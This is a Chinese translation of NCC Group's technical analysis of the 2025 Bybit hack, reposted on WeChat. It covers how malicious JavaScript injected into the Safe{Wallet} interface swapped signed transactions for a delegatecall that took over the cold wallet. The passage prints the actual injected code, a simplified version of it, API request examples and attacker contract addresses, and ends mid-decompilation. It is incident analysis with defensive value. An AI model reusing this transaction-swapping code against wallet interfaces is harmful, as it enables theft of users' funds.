---
title: 学习100篇xa0Web3xa0安全文章  多签安全 ①  | Bybit 黑客事件深度技术分析
url: https://mp.weixin.qq.com/s/xnT9QbLyRkPYWECFJgcFrA
source: Doonsec's feed
date: 2026-10-27
fetch_date: 2026-10-28T07:44:26.109102
---

# 学习100篇xa0Web3xa0安全文章  多签安全 ①  | Bybit 黑客事件深度技术分析

# 学习100篇 Web3 安全文章 多签安全 ① | Bybit 黑客事件深度技术分析

原创

nccgroup
nccgroup

Ice ThirdSpace

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

原文地址：https://www.nccgroup.com/research/in-depth-technical-analysis-of-the-bybit-hack/?utm\_source=chatgpt.com

2025 年 2 月 21 日，Bybit 遭遇了截至当时有记录以来规模最大的加密货币盗窃事件。超过 14 亿美元的资产，包括 401,347 枚 ETH，被从其冷钱包中转走。

攻击者通过改变 Bybit 签名人在批准冷钱包交易时看到的内容，破坏了交易审批流程，使签名人在不知情的情况下授权了一笔最终造成资金损失的交易。

为了实施攻击，攻击者将目标对准了 Safe{Wallet}。这是一种广泛使用的多签钱包方案，交易执行前需要获得多方批准；对于 Bybit，至少需要三名签名人。

这类钱包通过在签名流程中增加人工复核来提高安全性。然而，攻击者没有直接攻击多签机制，而是利用了管理该钱包的 Web 界面中的问题。

当 Bybit 的授权签名人审核一笔看起来只是常规内部转账的交易时，他们实际批准的请求，却将冷钱包智能合约的控制权交给了攻击者。

根据 Bybit 的取证调查，攻击者通过一台被攻陷的开发者电脑，将恶意 JavaScript 注入 Safe{Wallet} 用户界面。这些修改十分隐蔽，并且专门针对 Bybit：应用在其他情况下正常运行，只有当 Bybit 即将从冷钱包发起交易时才触发恶意行为。

资金被转走后，被认定为朝鲜国家支持黑客组织 Lazarus 的攻击者，展开了高度协调的资金分散与混淆行动，将被盗资产转移到多个钱包、去中心化交易所和混币协议中。

接下来，我们将拆解促成此次盗窃的两个阶段：

1. 恶意 JavaScript 如何欺骗签名人。
2. 攻击者如何利用合约和交易修改多签钱包逻辑，进而盗走全部资金。

## 一、链下攻击

如前所述，取证调查确认，恶意 JavaScript 文件是通过一台被攻陷的 Safe{Wallet} 开发者电脑遭到篡改的。

这台电脑具体如何失陷，目前仍不清楚。因此，我们先从恶意 JavaScript 文件已经公开可访问的阶段开始分析。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbWqHDTJoOj658P60vyyicYWjzibHEbDfcekicDg7UpYdZpSA5O8ksFzT2IzyjSr5pIDSpZJUcSC9ib91vSCjOibKTK79dFOt827RuuY/640?wx_fmt=png&from=appmsg)

###

### 1．被篡改的 JavaScript 文件

攻击者修改的 JavaScript 片段如下：

```
let wa=["0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4",
"0x19c6876e978d9f128147439ac4cd9ea2582cd141"];

let ba=["0x828424517f9f04015db02169f4026d57b2b07229",
"0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97"];

let ta="0x96221423681a6d52e184d440a8efcebb105c7242";

let da="0xa9059cbb000000000000000000000000bdd077f651
ebe7f7b3ce16fe5f2b025be29695160000000000000000000000
000000000000000000000000000000000000000000";

let op=1;
let vl=0;
let sga=45746;

let sf=sd.getSafeProvider();
let sa=await sf.getSignerAddress();
sa=sa.toLowerCase();

let lu=await sd.getAddress();
lu=lu.toLowerCase();

const cf=wa.some(k1 => lu.includes(k1));
const cb=ba.some(k1 => sa.includes(k1));

if(cb==true){
  location.href=location.href;
}

if(cf==true && se.data.operation==0){
  const td=structuredClone(se.data);

  se.data.to=ta;
  se.data.operation=op;
  se.data.data=da;
  se.data.value=vl;
  se.data.safeTxGas=sga;

  try {
    const r=await sd.signTransaction(se,st);
    r.data=td;
    se.data=td;
    return r;
  } catch (n) {
    se.data=td;
    throw n;
  }
```

*译注：以上保留附件中的代码和长字符串换行；附件代码片段本身不完整，不应直接作为可运行代码使用。*

将代码简化后，其主要功能如下：检测到 Bybit 签名人即将创建交易时，执行以下操作。

```
// 复制原始交易数据
origData = structuredClone(safeTx.data);

// 修改原本即将被签名的数据
safeTx.data.to =
  "0x96221423681A6d52E184D440a8eFCEbB105C7242";

safeTx.data.data =
  "0xa9059cbb000000000000000000000000bdd077f6
51ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000
000000000000000000000000000000000";

safeTx.data.operation = 1; // delegatecall
safeTx.data.value = "0";
safeTx.data.safeTxGas = "45746";

// 对交易签名
signedTx = await tryOffChainTxSigning(
  safeTx,
  safeVersion,
  sdk
);

// 将原始交易数据放回去，后文会进一步解释
signedTx.data = origData;
```

恶意 JavaScript 的行为可以概括为：

1. 判断是否命中针对 Bybit 的目标条件，否则正常运行。
2. 保存一份原本准备签名的交易数据。
3. 将待签数据替换为另一项操作。
4. 请求对篡改后的交易签名。
5. 签名人在钱包中批准后，把返回对象中的交易数据恢复为原始内容，**但保留针对恶意交易生成的签名**，随后将结果分享给其他签名人。

###

### 2．将篡改数据保存到 Safe{Wallet} API

要理解链下攻击的具体过程，需要先了解 Safe{Wallet} Web3 应用的工作方式。

对于 Safe 多签钱包，通常由一名用户先提出交易，并在这一过程中签名。随后，这笔交易会被交给其他签名人，他们会在界面中看到一笔等待批准的交易。

收集到全部所需签名后——Bybit 的情况是三个签名——任何地址都可以将交易提交到网络执行。

那么，签名协调是如何完成的？交易如何在 Safe 中被提出，又如何传递给其他签名人？

Safe 架构中负责协调待签交易消息的组件，是 **Safe Client Gateway**。该组件提供 API，其中一项功能是为指定钱包提出待签交易。

一笔正常转账可能通过如下请求提出：

```
POST /v1/chains/1/transactions/0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4/propose HTTP/1.1
Host: safe-client.safe.global
Content-Type: application/json

{
  "to": "0xf89d7b9c864f589bbF53a82105107622B35EaA40",
  "value": "60000000000000000000000",
  "data": "0x",
  "operation": 0,
  "baseGas": "0",
  "gasPrice": "0",
  "gasToken": "0x0000000000000000000000000000000000000000",
  "refundReceiver": "0x0000000000000000000000000000000000000000",
  "nonce": "0",
  "safeTxGas": "45745",
  "safeTxHash": "0x49bbd85fbd95873e0580d8212cfd28e31592f4958abe4596ae075",
  "sender": "0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC",
  "signature": "[发送者对上述数据生成的签名]"
}
```

从请求可以看到，URL 指定了负责该交易的 Safe 钱包，请求体包含交易详情、发送者信息及其签名。

这些数据保存在 Client Gateway 服务中，之后 Web 应用可以获取它们，通知其余签名人有交易等待签署。

于是，我们产生了一个疑问：

**签名人在 Web 界面和自己的钱包里，分别看到了什么？**

要回答这个问题，需要回到攻击者的代码：

```
signedTx.data = origData;
```

这一步发生在签名完成之后、交易提案提交到服务器之前。

如果攻击通过这一路径成功，就意味着服务器接受了一份**签名与提案交易数据不匹配**的交易提案。

反过来，如果 Client Gateway 保存的是被篡改后的交易，而不是原始交易，那么其余签名人在 Safe{Wallet} Web 应用里，应该会直接看到恶意交易。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbURyicicMe20b9ITL5YCt2OPMe2lW27bDAgy2nIZ2XFJ3H18v4KJFF1L6z7LhShPUmHRFcF6cFib7uTFBcClX5NKmKw6Z1ib4wgjuc/640?wx_fmt=png&from=appmsg)

*【原文图片：如果保存了篡改请求，Safe{Wallet} 界面会显示的信息。】*

攻击发生后，Safe Gateway 似乎提交了多项新的安全检查：在将数据传递给 Safe Transaction Service 之前，验证哈希和签名是否匹配，确保签名确实对应所提出的交易。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbUeMspu4YJnqD8CcbF8zRc5PAJTvzGAZFfH0iceSwPYXfZibPeOawsozQ8xK1HiaZb3nheFG3ia7CzMYlB2Tz1AicNOGaeick20gZTRo/640?wx_fmt=png&from=appmsg)

*【原文图片：Bybit 攻击发生后的 Safe 代码修改。】*

此外，用于获取 Bybit 地址所保存签名的请求也已经无法正常使用，例如：

```
0x1db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4/transactions/history
```

我们确认，当时部署在 `safe-client.safe.global` 的版本，不接受缺少匹配哈希和签名的篡改提案。

无论如何，只要控制了 Web 应用中的 JavaScript，攻击者就有能力修改展示给签名人的 HTML。

###

### 3．那么，签名人实际看到了什么？

按照前述分析，签名人收到的是原始交易数据，以及与这些原始数据不匹配的签名。因此，可以推测，他们在 Safe Web 界面中看到的是原本打算签署的交易。

但是，他们在自己的钱包里又看到了什么？

如果他们通过 MetaMask 等浏览器扩展钱包连接硬件钱包，原始交易与篡改交易的签名请求对比如下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbXHKIZ4k1zDTJOVa3fx89TrbCtIn74HBzWVaMud7mYpjCTicibOTtkL1qZ9vgicnPevJe3kjPb41NHs1DnEK0FfmGicwBUb2IIAQCo/640?wx_fmt=png&from=appmsg)*【原文图片：原始交易与篡改交易的签名请求对比。】*

部分硬件钱包支持 EIP-712 结构化消息，可以直接在硬件钱包屏幕上进行可读签名确认，而不是盲签。下面的图片展示了该交易在 Trezor Model T 上的显示效果。

*【原文图片：Trezor Model T 上显示的 EIP-712 消息。】*

如果所使用的硬件钱包不支持 EIP-712，就需要在设备上盲签。支持可读消息确认的硬件钱包，即使在签名人的电脑完全失陷的情况下，也可能缓解这类攻击。

虽然两笔交易看起来有所不同，但底层数据并不容易被人理解，因此很容易将二者混淆。

如果用户不能清楚理解交易数据，就可能忽略细微差别，误以为自己批准的是原本的交易，实际上却批准了篡改后的交易。

与普通 ERC-20 交易相比，最关键的变化是：

```
operation = 1，也就是 delegatecall
```

分析 Bybit 平时执行的操作可以发现，其通常是向热钱包转移原生 ETH。不过，这次操作也可能被误认为正常交易，因为 Bybit 过去确实执行过类似的合法 `delegatecall` 交易。

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbUn8tiaNhJDTuRY2sBIxsn8nuz1XCQxn5Jqd8YN16kXOSTqY3BFMfeF42iad1z7Cchh75RhvdAbibrzlk0richia7MdK2u4AxHUX3Mk/640?wx_fmt=png&from=appmsg)

*【原文图片：1 月 14 日转移 mETH 代币的一笔类似交易。】*

而在本次攻击中，交易调用的是一个任意合约，使用类似 ERC-20 `transfer` 的函数签名，并将代币数量设置为零。

如果仔细检查签名对应的数据，尤其是 `data` 参数和操作类型——`call` 还是 `delegatecall`——本可以避免此次盗窃。

但是，`delegatecall` 内部调用数据缺乏易于理解的展示形式，使签名人更容易犯错。

###

### 4．EIP-712 签名

普通交易的签名有效性由区块链本身验证；这里指以太坊。

但在本案例中，钱包并不是直接对普通链上交易签名，而是使用 **EIP-712 标准签署一条消息**。

EIP-712 的目的是让用户签署人类可读的结构化消息，而不是任意字节数据。钱包可以用更易读的方式显示签名内容，从而提高安全性。

不过，在本案例中，即使 MetaMask 或 Rabby 等常见 Web 钱包能够显示 `ExecuteTransaction` 消息的参数，EIP-712 仍然没有解决**如何把嵌套操作展示为人类可读内容**的问题。

钱包如果要准确展示用户正在签署的操作，就需要知道：

`to` 和 `data` 参数共同描述了一次合约调用，而且其中的数据还可以继续解码。

在这个案例中，如果冷钱包使用针对实际需求设计的智能合约，而不是 Safe 这样功能更复杂的钱包，就可能让签名消息更容易理解，也可能避免这次攻击。

##

## 二、链上攻击

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbXHC0iazeUEFk3yib5ALibXvCRm2l4KrEsibfm47NVdnwhJQ3UpALTGmbw9Hhxn4pOEshNJDic1IDPWjw8qK5niauxOB2mibvUXnxLhBM/640?wx_fmt=png&from=appmsg)

*【原文图片：链上攻击流程图。】*

### 1．相关合约

要理解攻击，需要了解代理合约、Safe 实现合约——也称 `masterCopy`——以及攻击者合约。

|  |  |  |
| --- | --- | --- |
| **合约** | **地址** | **作用** |
| **Bybit 冷钱包** | `0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4` | 代理合约，将调用委托给实现合约 |
| **Gnosis Safe 实现合约，**`masterCopy` | `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F` | 包含 Safe 多签钱包逻辑 |
| **攻击者合约** | `0x96221423681A6d52E184D440a8eFCEbB105C7242` | 伪装成 ERC-20 转账，实际修改实现地址 |

代理合约的设计很直接。

它通过 `masterCopy` 变量保存实现合约地址，该变量对应合约存储中的 **slot 0**。代理本质上会把执行过程委托给这个地址所指向的代码。

Gnosis Safe 的 `masterCopy` 合约包含全部钱包逻辑。只要获得预先规定数量的白名单签名人签名，它就允许执行任意交易，包括对任意合约执行 `call` 和 `delegatecall`。

攻击者合约的字节码可以反编译为：

```
def storage:  stor0 is uint256 at storage 0def _fallback() payable: # 默认函数  revertdef transfer(address _to, uint256 _value) payable:  require calldata.size - 4 >= 64  require _t...